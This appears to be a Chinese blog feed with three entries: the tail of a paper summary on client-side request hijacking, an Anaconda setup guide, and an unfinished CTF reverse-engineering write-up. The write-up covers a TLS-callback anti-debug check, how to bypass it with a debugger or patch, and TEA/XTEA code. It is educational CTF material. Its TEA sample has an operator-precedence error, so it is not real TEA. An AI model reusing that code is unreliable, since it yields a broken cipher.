个易受攻击的数据流，突显了新漏洞的广泛存在。然后，21.9% 的请求劫持是我们考虑使用新浏览器 API 的新变体。</p><p>​发现的劫持造成的危害中最常见的是客户端 CSRF，其中 96% 的漏洞（即 196K）可以被滥用。然而，48.5% 的可劫持请求也可能被滥用进行信息泄露，因为攻击者可以控制请求发送到的端点，从而窃取请求正文中包含的敏感信息，例如 CSRF 令牌、PII、推送端点和加密密钥。最不常见的后果是推送订阅上的持续 DoS，占漏洞总数的 0.2%。其他常见后果是客户端 XSS 和开放重定向，总共影响 10.1% 的页面。最后，4.2%的漏洞可能导致WebSocket和EventSource的跨站点连接劫持。</p><p>​通过修补漏洞检测所需的缺失 HPG 边缘（即混合数据流路径），帮助静态分析识别 17.9K 额外数据流。然而，表 3 强调了纯动态分析的一个关键挑战：报告的污点流规模很大，其中大部分不受攻击者控制（参见表 10）。相反，静态分析能够检测到 66.2K 数据流。因此，动态和静态分析的结合可能是有利的。动态分析通过补充 HPG 边缘（例如调用图）来增强静态分析，而静态分析有助于消除攻击者无法控制的虚假污点流（例如由于输入验证）。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-20_22-48-43.png" class=""><p>​表 6 总结了在调查过程中发现的攻击。我们总共在 49 个网站上创建了 67 个概念验证漏洞，产生了深远的影响，例如 CSRF、客户端 XSS、开放重定向以及跨各种流行平台和功能的敏感信息泄漏。值得注意的是，我们发现了 Starz 电影流服务中的帐户接管漏洞、Microsoft Azure 中的用户 VM 删除、Google DoubleClick 和 VK 中的任意重定向、DW 和 BBC 中的帐户设置操纵、Indeed 中的工作申请篡改、通过 WebSocket 的数据泄露JustWatch 和 Forbes 中的 EventSource 劫持、Reddit 中 PushManager 订阅的 CSRF、Yoox 购物网站中推送通知的持久客户端 DoS，以及 TP-Link 中的客户端 XSS，仅举几个例子。其中，24 个站点的总共 33 个漏洞属于我们工作中提出的新漏洞类型。我们建议感兴趣的读者参阅§A.2，了解已确认攻击的案例研究。</p><h3 id="防御策略评估"><a href="#防御策略评估" class="headerlink" title="防御策略评估"></a>防御策略评估</h3><p>​本节讨论 RQ3，我们在其中审查和评估针对客户端请求劫持漏洞的现有对策的采用情况和有效性。我们系统地调查了学术文献、W3C 规范和 OWASP CheatSheet Series，寻找经典的反 CSRF 对策和那些可以减轻客户端请求劫持的防御措施。总的来说，研究者确定了 10 种不同的请求伪造防御措施，并根据执行方（即 Web 应用程序或浏览器）将其分为两大类。</p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_20-45-26.png" class=""><p>​我们的分析发现，约 47% 的易受攻击的数据流没有任何输入验证检查，这表明开发人员很大程度上没有意识到与控制客户端请求相关的风险。</p><p>​<code>window.open()</code>在新窗口中打开易受攻击的目标页面，<code>COOP</code>可用于将浏览上下文与同源文档隔离。例如，如果在新窗口中打开一个诚实的、带有<code>COOP</code>的跨域页面，则恶意打开的页面将不会引用它，从而阻止攻击者设置窗口名称，或向新窗口发送<code>postMessages</code>，这在<code>turn</code>可以防止伪造这些输入生成的请求。我们发现大约 7% 的请求劫持数据流可以通过<code>COOP</code>缓解，因为它们依赖于窗口名称、文档引用者和<code>postMessages</code>来提供程序输入。然而，我们观察到，只有 ∼1.9% 的网页实施了<code>COOP</code>，而且令人惊讶的是，没有一个表现出请求劫持数据流的网页采用了这一政策，这呼吁人们提高对<code>COOP</code>的认识。</p><p>累了😥</p>]]></content>
    
    
    <categories>
      
      <category>论文阅读</category>
      
    </categories>
    
    
    <tags>
      
      <tag>论文阅读</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Anaconda安装与使用</title>
    <link href="/2024/01/26/Anaconda%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2024/01/26/Anaconda%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>老是忘，浅浅记录一下</p><span id="more"></span><h3 id="Anaconda安装配置"><a href="#Anaconda安装配置" class="headerlink" title="Anaconda安装配置"></a>Anaconda安装配置</h3><p>下载链接：</p><p><a href="https://www.anaconda.com/download/">官网</a></p><p>双击anaconda.exe直接运行安装包，一直Next到下图位置：</p><p>第一个选项是添加环境变量，默认是没有勾选的，请务必勾选上，如果这里不勾选，后续安装完成后要自行添加环境变量</p><img src="/2024/01/26/Anaconda%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Snipaste_2024-05-21_13-56-15.png" class=""><p>1.修改为清华源<br>直接打开cmd输入以下命令<br>conda config –add channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</a><br>conda config –add channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</a><br>conda config –add channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud//pytorch/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud//pytorch/</a><br>conda config –add channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/</a><br>conda config –set show_channel_urls yes<br>2.移除清华源<br>输入：conda config –remove channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/</a><br>这个命令是为了移除之前conda config –show channels显示的清华源。</p><h3 id="Anaconda使用"><a href="#Anaconda使用" class="headerlink" title="Anaconda使用"></a>Anaconda使用</h3><p>主要用的两个为Anaconda Prompt 和Anaconda Navigator</p><p><code>conda info</code>查看当前环境的信息</p><p><code>conda</code>配置新环境</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> CONDA_FORCE_32BIT=1 <span class="hljs-comment"># 切换到32位</span><br><span class="hljs-built_in">set</span> CONDA_FORCE_32BIT=0 <span class="hljs-comment"># 切换到64位</span><br>conda create -n pytorch python=3.10<br>conda <span class="hljs-built_in">env</span> list<br>conda activate pytorch<br>conda install matplotlib<br></code></pre></td></tr></table></figure><p><code>conda create -n xxx python=2.7</code>创建一个python2.7 名为xxx的虚拟环境，如要创建32位的python环境，先设置为32位在创建环境，这样创建好的环境即为32位的Python环境，先切换到创建好的环境中，然后输入python 检查下是否为32位的python2.7版本</p><p>在<code>pycharm</code>中使用<code>conda</code>环境：</p><p>在创建新的项目时，选择先前配置的解释器，然后选择自己已经配置好的<code>conda</code>环境即可。</p><img src="/2024/01/26/Anaconda%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Snipaste_2024-01-26_14-06-38.png" class=""><h3 id="解决Powershell中无法切换环境问题"><a href="#解决Powershell中无法切换环境问题" class="headerlink" title="解决Powershell中无法切换环境问题"></a>解决Powershell中无法切换环境问题</h3><p>在terminal中输入然后重新打开</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda init powershell<br></code></pre></td></tr></table></figure><h3 id="解决conda新环境pip出现SSLError"><a href="#解决conda新环境pip出现SSLError" class="headerlink" title="解决conda新环境pip出现SSLError"></a>解决conda新环境pip出现SSLError</h3><p>大概率是因为开了全局代理，证书不安全导致，关闭系统代理即可</p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023强网杯babyre</title>
    <link href="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/"/>
    <url>/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/</url>
    
    <content type="html"><![CDATA[<p>这道题比赛的时候做了半天也没有做出了，加密部分倒是搞懂了，就是得不到正确的flag</p><span id="more"></span><h3 id="做题前置知识"><a href="#做题前置知识" class="headerlink" title="做题前置知识"></a>做题前置知识</h3><h4 id="TLS反调试机制"><a href="#TLS反调试机制" class="headerlink" title="TLS反调试机制"></a>TLS反调试机制</h4><p><a href="https://www.52pojie.cn/thread-1490663-1-1.html">参考文章1</a></p><p><a href="https://www.cnblogs.com/helloylh/p/17209669.html">参考文章2</a></p><p><code>TLS</code>是<code>Thread Local Storage</code>的缩写，即线程局部存储。<strong>主要是为了解决多线程中变量同步的问题</strong>。</p><p>根据我们所学习的<code>OS</code>的知识，进程中的全局变量和函数内的静态变量，是各个线程都可以访问的共享变量，即<code>线程a</code>修改后，<code>线程b</code>访问时就不是原来的了，当然<code>OS</code>利用信号量解决这种同步问题。</p><p>这造成昂贵的同步开销，所以我们选择一种方式使得每个线程可以保有自己的内部变量，被称为<code>static memory local to a thread</code>线程局部静态变量。这一种新的实现机制就是<code>TLS</code></p><p>强网杯这道题具体用的应该是静态绑定</p><p>那么关于TLS在C++中的具体实现应该如下：</p><ol><li><p>编译器声明使用TLS回调</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64       <span class="hljs-comment">//64位</span></span><br>     <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">"/INCLUDE:_tls_used"</span>)  </span><br>     <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">"/INCLUDE:tls_callback_func"</span>) </span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span>               <span class="hljs-comment">//32位</span></span><br>     <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">"/INCLUDE:__tls_used"</span>) </span><br>     <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">"/INCLUDE:_tls_callback_func"</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure></li><li><p>编写TLS回调函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> NTAPI <span class="hljs-title">tls_callback</span><span class="hljs-params">(PVOID Dllhandle, DWORD Reason, PVOID Reserved)</span> </span>{<br>    BOOL ret;<br>    <span class="hljs-built_in">CheckRemoteDebuggerPresent</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), &amp;ret);<span class="hljs-comment">//检测是否被调试</span><br>    <span class="hljs-keyword">if</span> (ret) {<br>        <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//退出程序</span><br>    }   <br>}<br></code></pre></td></tr></table></figure></li><li><p>注册TLS回调函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64                           <span class="hljs-comment">//64位</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> const_seg(<span class="hljs-string">".CRT$XLF"</span>)</span><br>    EXTERN_C <span class="hljs-type">const</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg(<span class="hljs-string">".CRT$XLF"</span>)        <span class="hljs-comment">//32位</span></span><br>    EXTERN_C<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>PIMAGE_TLS_CALLBACK tls_callback_func[] = { tls_callback,<span class="hljs-number">0</span> };<br><span class="hljs-comment">//这里是个回调函数数组，可以定义多个，可以为空，0必须加上用于结束</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64                           <span class="hljs-comment">//64位</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> const_seg()</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg()                  <span class="hljs-comment">//32位</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">//_WIN64</span></span><br></code></pre></td></tr></table></figure></li></ol><p>至于TLS在程序运行过程中的变化应该是这样的：</p><ol><li><strong>OS加载可执行文件，查找所有TLS回调函数，不用从OEP进去后到主线程执行</strong></li><li><strong>OS在重新启动时（或者线程创建销毁），调用TLS回调函数</strong></li><li><strong>进入（返回）主函数</strong></li></ol><h4 id="TEA加密算法"><a href="#TEA加密算法" class="headerlink" title="TEA加密算法"></a>TEA加密算法</h4><p><a href="https://www.cnblogs.com/zpchcbd/p/15974293.html">参考文章</a></p><p>算法特点：</p><ol><li>使用64位(8byte)明文分组和128位密钥(4*32bit,通常是4个8byte数组)</li><li>sum是用于每轮混淆，每次加δ</li><li>使用Feistel分组加密框架（使用上一轮生成的数据和原始数据的另一半进行XOR异或操作，作为下一轮轮函数的输入），一般为32轮</li></ol><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_15-20-48.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> delta 0x9E3779B9 <span class="hljs-comment">//常数Delta</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// 加密</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *EntryData,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>{<br>    <span class="hljs-comment">// 根据算法，分为8字节一轮</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 = EntryData[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 = EntryData[<span class="hljs-number">1</span>];<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">32</span>;i++){<br>        sum += delta;<br>        v0 += (v1&lt;&lt;<span class="hljs-number">4</span> + Key[<span class="hljs-number">0</span>])^(v1 + sum)^(v1&gt;&gt;<span class="hljs-number">5</span> + Key[<span class="hljs-number">1</span>]);<br>        v1 += (v0&lt;&lt;<span class="hljs-number">4</span> + Key[<span class="hljs-number">2</span>])^(v0 + sum)^(v0&gt;&gt;<span class="hljs-number">5</span> + Key[<span class="hljs-number">3</span>]);<br>    }<br>    EntryData[<span class="hljs-number">0</span>] = v0;<br>    EntryData[<span class="hljs-number">1</span>] = v1;<br>}<br><span class="hljs-comment">// 解密，加密反过来就行</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Encrypted_data,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = delta*<span class="hljs-number">32</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 = Encrypted_data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 = Encrypted_data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">32</span>;i++){<br>        <span class="hljs-comment">// 先算v1</span><br>        v1 -= (v0&lt;&lt;<span class="hljs-number">4</span> + Key[<span class="hljs-number">2</span>])^(v0 + sum)^(v0&gt;&gt;<span class="hljs-number">5</span> + Key[<span class="hljs-number">3</span>]);<br>        v0 -= (v1&lt;&lt;<span class="hljs-number">4</span> + Key[<span class="hljs-number">0</span>])^(v1 + sum)^(v1&gt;&gt;<span class="hljs-number">5</span> + Key[<span class="hljs-number">1</span>]);<br>        sum -= delta;<br>    }<br>    Encrypted_data[<span class="hljs-number">0</span>] = v0;<br>    Encrypted_data[<span class="hljs-number">1</span>] = v1;<br>}<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Data[<span class="hljs-number">3</span>]={<span class="hljs-number">0x48535833</span>,<span class="hljs-number">0x21455230</span>,<span class="hljs-number">0x0</span>};<br>    cout &lt;&lt; <span class="hljs-string">"明文："</span> &lt;&lt; (<span class="hljs-type">char</span>*)Data &lt;&lt;endl;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  Key[<span class="hljs-number">4</span>] = { <span class="hljs-number">0x212A3D44</span>,<span class="hljs-number">0x15667788</span>,<span class="hljs-number">0x92AABBCC</span>,<span class="hljs-number">0xD12EFF11</span>};<br>    <span class="hljs-built_in">Encrypt</span>(Data,Key);<br>    cout &lt;&lt; <span class="hljs-string">"密文："</span> &lt;&lt; *Data &lt;&lt;<span class="hljs-string">" "</span>&lt;&lt; *(Data+<span class="hljs-number">1</span>) &lt;&lt;endl;<br>    <span class="hljs-built_in">Decrypt</span>(Data,Key);<br>    cout &lt;&lt; <span class="hljs-string">"明文："</span> &lt;&lt; (<span class="hljs-type">char</span>*)Data &lt;&lt;endl;<br>}<br></code></pre></td></tr></table></figure><h4 id="XTEA加密算法"><a href="#XTEA加密算法" class="headerlink" title="XTEA加密算法"></a>XTEA加密算法</h4><p>XTEA（TEAN）算法相比于TEA的改变在于：<strong>取哪一个密钥通过sum计算得到，而TEA是固定下标</strong></p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_21-49-41.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> delta 0x9E3779B9</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// 加密</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Data,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 = Data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 = Data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">32</span>;i++){<br>        v0 += ((v1&lt;&lt;<span class="hljs-number">4</span>)^(v1&gt;&gt;<span class="hljs-number">5</span>) + v1) ^ (sum + Key[sum&amp;<span class="hljs-number">3</span>]);<span class="hljs-comment">//sum&amp;3:00,01,11</span><br>        sum += delta;<br>        v1 += ((v0&lt;&lt;<span class="hljs-number">4</span>)^(v0&gt;&gt;<span class="hljs-number">5</span>) + v0) ^ (sum + Key[(sum&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>]);<span class="hljs-comment">//将sum高五位中的低两位获取</span><br>    }<br>    Data[<span class="hljs-number">0</span>] = v0;<br>    Data[<span class="hljs-number">1</span>] = v1;<br>}<br><span class="hljs-comment">// 解密</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Encrypted_data,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = delta*<span class="hljs-number">32</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 =Encrypted_data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 =Encrypted_data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">32</span>;i++){<br>        v1 -= ((v0&lt;&lt;<span class="hljs-number">4</span>)^(v0&gt;&gt;<span class="hljs-number">5</span>) + v0) ^ (sum + Key[(sum&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>]);<br>        sum -= delta;<br>        v0 -= ((v1&lt;&lt;<span class="hljs-number">4</span>)^(v1&gt;&gt;<span class="hljs-number">5</span>) + v1) ^ (sum + Key[sum&amp;<span class="hljs-number">3</span>]);<br>    }<br>    Encrypted_data[<span class="hljs-number">0</span>] = v0;<br>    Encrypted_data[<span class="hljs-number">1</span>] = v1;<br>}<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{<br>    cout&lt;&lt; <span class="hljs-string">"这是XTEA算法!"</span>&lt;&lt;endl;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Data[<span class="hljs-number">3</span>]={<span class="hljs-number">0x48535833</span>,<span class="hljs-number">0x21455230</span>,<span class="hljs-number">0x0</span>};<br>    cout &lt;&lt; <span class="hljs-string">"明文："</span> &lt;&lt; (<span class="hljs-type">char</span>*)Data &lt;&lt;endl;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  Key[<span class="hljs-number">4</span>] = { <span class="hljs-number">0x212A3D44</span>,<span class="hljs-number">0x15667788</span>,<span class="hljs-number">0x92AABBCC</span>,<span class="hljs-number">0xD12EFF11</span>};<br>    <span class="hljs-built_in">Encrypt</span>(Data,Key);<br>    cout &lt;&lt; <span class="hljs-string">"密文："</span> &lt;&lt; *Data &lt;&lt;<span class="hljs-string">" "</span>&lt;&lt; *(Data+<span class="hljs-number">1</span>) &lt;&lt;endl;<br>    <span class="hljs-built_in">Decrypt</span>(Data,Key);<br>    cout &lt;&lt; <span class="hljs-string">"明文："</span> &lt;&lt; (<span class="hljs-type">char</span>*)Data &lt;&lt;endl;<br>}<br></code></pre></td></tr></table></figure><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_21-49-02.png" class=""><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><h4 id="解决TLS反调试"><a href="#解决TLS反调试" class="headerlink" title="解决TLS反调试"></a>解决TLS反调试</h4><p>首先我们已经知道了这道题加了TLS反调试，然后学习了具体的原理，现在就是实践中去摸索到底时如何实现的。</p><h5 id="寻觅TLS"><a href="#寻觅TLS" class="headerlink" title="寻觅TLS"></a>寻觅TLS</h5><p>打开IDA调试，首先我们进入到程序入口位置，</p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-21_22-01-41.png" class=""><p>然后一直点击到内层函数，直到此处，重命名为<code>check_DBG</code>，点击进去分析就知道为啥这里是了</p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-21_22-03-02.png" class=""><p>然后里面是这样的：这里已经很明显用了<code>TLS</code>反调试了，如果返回值表示正在被调试，那么直接退出进程；反之才会进入我们的<code>encrypt_func()</code></p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-21_22-05-35.png" class=""><p>当然为了更加确认，我们可以在IDA中搜索字符串，发现一个<code>SomeThing Go Wrong\n</code>，点击到该处位置，对函数按<code>x</code>发现交叉引用，发现在两个<code>TLS</code>的<code>callback</code>函数。</p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_10-59-22.png" class=""><p>点击到一个回调函数分析：和我上面列举的<code>TLS</code>反调试例子就很像了</p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_11-06-42.png" class=""><p>所以可以发现，<strong>如果存在<code>tlsCallback_</code>之类的函数就得小心了，IDA按<code>shift+F7</code>查看代码段，如果存在<code>.tls</code>也得小心了</strong></p><h5 id="反反调试"><a href="#反反调试" class="headerlink" title="反反调试"></a>反反调试</h5><p>至此我们确定<code>babyre</code>这道题使用了<code>TLS</code>来反调试，那么接下来的问题就是如何反反调试，<strong>这里首先有个简单的方法，首先自己运行程序，然后用x64dbg附加进程，就可以动态调试了，但是这样不太方便，每次都要重新跑程序。</strong></p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_17-01-58.png" class=""><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_17-02-28.png" class=""><p>通过上面的方法拿到的密文和密钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">E0 F2 23 95 93 C2 D8 8E 93 C3 68 86 BC 50 F2 DD<br>99 44 0E 51 44 BD 60 8C F2 AB DC 34 60 D2 0F C1<br><br>62 6F 6D 62<br></code></pre></td></tr></table></figure><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_15-12-03.png" class=""><p>这里采用修改汇编代码的方式把反调试给patch掉，笔者也是第一次做这种操作，太菜了😭</p><p>首先需要定位到在哪里我们可以进入正常的加密算法，在上面我们已经分析出来了，就在我们重命名的<code>check_DBG</code>函数里，接下来计算地址，</p><p>(期末考试ing，未完待续)</p><h3 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h3><p>进入主逻辑中的加密算法，首先有0-1、2-3、4-5、6-7两个一组进去加密，根据我们刚刚拿到的密文，可以发现就是一共4组，每组64bit，和上面的TEA和XTEA的输入要求是一样。</p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_22-01-37.png" class=""><p>进入函数分析，发现确实就是一个魔改过的XTEA算法，具体在轮数是33，加密方式变为<code>(v1*5)^(v1&gt;&gt;4)</code>，其他的大差不差的😋</p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_22-09-55.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 